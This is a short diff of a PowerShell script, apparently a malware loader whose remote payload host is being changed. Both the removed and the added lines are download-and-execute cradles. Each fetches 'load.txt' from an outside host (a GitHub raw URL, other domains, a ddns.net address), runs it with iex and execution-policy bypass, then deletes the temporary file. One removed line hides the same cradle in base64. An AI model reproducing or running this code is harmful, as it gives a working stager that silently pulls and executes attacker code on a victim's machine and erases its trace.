@@ -1,5 +1,1 @@
-$tmp="c:\TEMP\"+((Get-Random).ToString())+".ps1";Invoke-WebRequest -Uri https://raw.githubusercontent.com/myfiles2021/-literate-fortnight/main/source/load.txt -OutFile $tmp; iex "$tmp . xls";Remove-Item $tmp;
-
-$tmp=((Get-Random).ToString())+".ps1";Invoke-WebRequest -Uri kgc.sbox.sg/test/load.txt -OutFile $tmp; iex "powershell -ExecutionPolicy Bypass -File $tmp . xls";Remove-Item $tmp;
-
- iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAB0AG0AcAA9ACIAYwA6AFwAVABFAE0AUABcACIAKwAoACgARwBlAHQALQBSAGEAbgBkAG8AbQApAC4AVABvAFMAdAByAGkAbgBnACgAKQApACsAIgAuAHAAcwAxACIAOwBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBtAHkAZgBpAGwAZQBzADIAMAAyADEALwAtAGwAaQB0AGUAcgBhAHQAZQAtAGYAbwByAHQAbgBpAGcAaAB0AC8AbQBhAGkAbgAvAHMAbwB1AHIAYwBlAC8AbABvAGEAZAAuAHQAeAB0ACAALQBPAHUAdABGAGkAbABlACAAJAB0AG0AcAA7ACAAaQBlAHgAIAAiACQAdABtAHAAIAAuACAAeABsAHMAIgA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAdABtAHAAOwA=')))
+$o=((Get-Random).ToString())+".ps1";Invoke-WebRequest -Uri 3fdc.ddns.net/load.txt -OutFile $o; iex "powershell -ExecutionPolicy Bypass -File $o . xls";Remove-Item $o;
